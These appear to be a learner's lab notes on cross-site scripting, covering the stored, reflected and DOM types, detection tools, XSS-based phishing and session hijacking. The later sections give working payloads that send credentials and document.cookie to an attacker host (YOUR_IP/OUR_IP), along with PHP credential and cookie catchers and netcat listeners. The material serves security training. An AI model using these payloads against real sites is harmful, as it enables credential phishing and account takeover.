# What is XSS?

XSS happens when user input is not properly sanitized.

- Attackers insert JavaScript into fields like comments or forms.
- When others view the page, their browser runs the malicious script.

**✅ XSS runs only in the browser (client-side), not on the server.**
**⚠️ It's a medium risk vulnerability: low impact on the server, but high chance of being found and used.**

**XSS can lead to many attacks, including:**

- Stealing cookies/session tokens
- Triggering unwanted API calls
- Defacing pages or showing fake ads
- Launching self-replicating worms (like the Samy Worm on MySpace)
- In rare cases, executing system-level code if combined with browser exploits.


| Type              | Description                                                                                                                          |
| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| **Stored XSS**    | Input is saved (e.g., in a DB) and shown to users later. Very dangerous.                                                             |
| **Reflected XSS** | Input is returned in the response, like in a search result or error message.                                                         |
| **DOM-based XSS** | Happens on the **client-side only**, without going to the server. Often through JavaScript handling of URL fragments or form inputs. |


# Stored XSS

**A malicious script is saved in the backend (e.g., a database) and then shown to anyone who visits the affected page.**
- → High risk because it affects all users, not just one.

**Try this test payload:**

`<script>alert(window.origin)</script>`
- If an alert box pops up → XSS is working.
- Refresh the page. If it pops up again → Stored XSS confirmed (payload was saved).


# Reflected XSS (Non-Persistent)

- A Non-Persistent XSS type.
- Input is sent to the server, returned in the response, but not stored.
- Only affects the user who triggers it, not others.
- XSS goes away after navigating or refreshing the page.

**Practice Example**

- Visit: http://SERVER_IP:PORT/
- Try entering: test → You get:
- "Task 'test' could not be added."
- Enter an XSS payload and click Add:
`<script>alert(window.origin)</script>`
- You’ll see an alert pop up = success

**Page Source Check**

You’ll see:

Task '<script>alert(window.origin)</script>' could not be added.
It has Non-Persistent Behavior
Reloading the page = no more alert.
So the payload doesn’t stay = Reflected XSS.

# 🧠 What is DOM XSS?

DOM-based XSS is a type of non-persistent XSS attack. Unlike Reflected XSS, where input is sent to the server, 
DOM XSS happens completely in the browser, using JavaScript to update the page without talking to the back-end.

**🧪 How do you know it’s DOM XSS?**
You enter something like test on the site, and it updates the page with:

- Next Task: test
- But if you open the Network tab in the browser dev tools, you’ll see:
- No HTTP requests happened.

**The URL changed to something like:**

`http://SERVER_IP/#task=test`

That #task=test is client-side only — it never hits the server. That’s the clue it’s DOM-based.

Also:

- The source code (CTRL+U) won’t show your input.
- The page is updated after loading — by JavaScript.
- If you refresh the page, the input is gone → Non-Persistent.

**🔍 Example Code**

<pre>// Source
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);

// Sink (vulnerable)
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);</pre>

**🔹 Source**
The input — like a URL parameter task=... — is the Source.

**🔹 Sink**
A function that puts the input onto the page — like `innerHTML` — is the Sink.

If a Sink uses unsafe functions like:

`document.write()`
`element.innerHTML`
`element.outerHTML`
Or jQuery’s `append()`, `add()`, etc.

…without sanitizing the input, you’ve got a DOM XSS vulnerability.

**💥 DOM XSS Attack**

The basic payload with `<script>` **doesn’t work** here because innerHTML blocks it.

Instead, try:

`<img src="" onerror=alert(window.origin)>`

This makes a broken image, which triggers the onerror to run JavaScript.

Your full attack URL would be:

`http://SERVER_IP/#task=<img src="" onerror=alert(window.origin)>`

Send that link to someone → when they click, the alert pops up. Boom: DOM XSS.

| Feature           | DOM XSS                           |
| ----------------- | --------------------------------- |
| Goes to server?   | ❌ No, browser only                |
| Stored?           | ❌ No, not saved                   |
| Needs JavaScript? | ✅ Yes                             |
| Triggered by?     | Input in URL, processed by JS     |
| Dangerous if?     | Input is inserted without filters |


# XSS Discovery:


**🛠️ 1. Automated Tools**

Tools like Burp Suite Pro, OWASP ZAP, and Nessus can help find XSS.

They use two scanning methods:
- Passive Scan: Looks for issues in front-end code (DOM XSS)
- Active Scan: Sends test payloads to trigger XSS

**1 - Open-source XSS tools:**

XSStrike - https://github.com/s0md3v/XSStrike

BruteXSS - https://github.com/shawarkhanethicalhacker/BruteXSS-1

XSSer - https://github.com/epsylon/xsser

XSStrike:

<pre>git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"</pre>

**But ⚠️ Always manually verify — a reflected input doesn’t guarantee XSS will execute.**

**2 - Manual Testing**

Try adding known XSS payloads manually in:

- Form fields
- URLs
- Headers (like Cookie, User-Agent)

💡 Example payloads:

`<script>alert(1)</script>`
`<img src=x onerror=alert(1)>`

Resources for payloads:

PayloadAllTheThings - https://github.com/swisskyrepo/PayloadsAllTheThings

**⚠️ Most won’t work everywhere — different inputs need different payload types (quotes, tags, encoding, etc.).**

**3 - Code Review**

Looking at the code (front-end & back-end) tells you:

- How input is handled
- Where it’s output
- If it’s filtered/sanitized

Examples:

- Reflected/Stored: Look at how server returns user input
- DOM XSS: Look for unsafe JavaScript sinks like innerHTML, document.write, etc.

In real-world apps, automated tools often miss XSS, especially if input is encoded or protected.
Manual code review can find what tools can’t.

# Phishing with XSS

**Step 1: Find the XSS**

Go to the vulnerable page:

`http://SERVER_IP/phishing/index.php?url=IMAGE_LINK`

Test an XSS payload like:

`<script>alert(1)</script>`

**If that doesn’t work, inspect the HTML output to tweak your payload until it executes.**

**💻 Step 2: Inject a Fake Login Form**

Once XSS is working, inject a login form that sends input to your machine:

<pre><script>
document.write('<h3>Please login to continue</h3><form action=http://YOUR_IP><input name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>');
</script></pre>

**🧹 Step 3: Clean the Page**

Remove the original input field (to make the login form look more real):

`document.getElementById('urlform').remove();`

Add that after your form in the same script:

<pre><script>
document.write('...form...');document.getElementById('urlform').remove();
</script></pre>

Add <!-- at the end to hide leftover HTML:

`...</script><!--`

**🧲 Step 4: Catch the Credentials**

Option 1: Quick Test with Netcat

`sudo nc -lvnp 80`

When someone submits the form, credentials show up like:

`GET /?username=admin&password=pass123`

**Option 2: Save Credentials with PHP**

Create this index.php file:

<pre><?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    file_put_contents("creds.txt", "User: {$_GET['username']} | Pass: {$_GET['password']}\n", FILE_APPEND);
    header("Location: http://SERVER_IP/phishing/index.php");
    exit();
}
?></pre>

Then:

<pre>mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php #At this step we wrote our index.php file
sudo php -S 0.0.0.0:80</pre>

**🧪 Test It**

- Visit the final payload URL
- Log in using dummy data
- Check creds.txt — you’ll see:

`User: test | Pass: test`

# Session Hijacking

**🛡️ Session Hijacking (Cookie Stealing)**

- Websites use cookies to keep users logged in.
- If someone steals your cookie, they can access your session without needing your password.

**🎯 Goal**

Use XSS to steal a victim's session cookie and log in as them.

**🕶️ Blind XSS**

- Happens when your XSS payload runs in a page you can’t see (e.g. Admin Panel).
- You inject code somewhere (e.g., a form), but it only gets triggered when an Admin views it.

**🔍 Common Places for Blind XSS:**

- Contact forms
- Reviews
- Support tickets
- User-agent headers

**🧪 Step 1: Web Server**

Start a test web server:

<pre>mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80</pre>


**🧪 Step 2 Try these payloads in each input field (except password/email):**

Use one of these payloads for bypassing basic payloads:

`<script src=http://OUR_IP></script>`

`'><script src=http://OUR_IP></script>`

`"><script src=http://OUR_IP></script>`

`javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')`

`<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>`

`<script>$.getScript("http://OUR_IP")</script>`

**Dont forget to change path names:**
`<script src=http://YOUR_IP/fullname></script>`
`<script src=http://YOUR_IP/username></script>`

Keep checking your terminal. If your server gets a hit, that input is vulnerable!

**🎣 Step 3: Perform Session Hijacking**

1. Create script.js:

`new Image().src='http://YOUR_IP/index.php?c='+document.cookie`

2. Create a PHP Catcher (optional)
Save as index.php:

<pre><?php
if (isset($_GET['c'])) {
  $cookies = explode(";", $_GET['c']);
  foreach ($cookies as $cookie) {
    file_put_contents("cookies.txt", "IP: {$_SERVER['REMOTE_ADDR']} | Cookie: " . urldecode($cookie) . "\n", FILE_APPEND);
  }
}
?></pre>

**📦 Step 5: Use the cookie**

When you get the cookie, change the cookie value to log in as Admin.
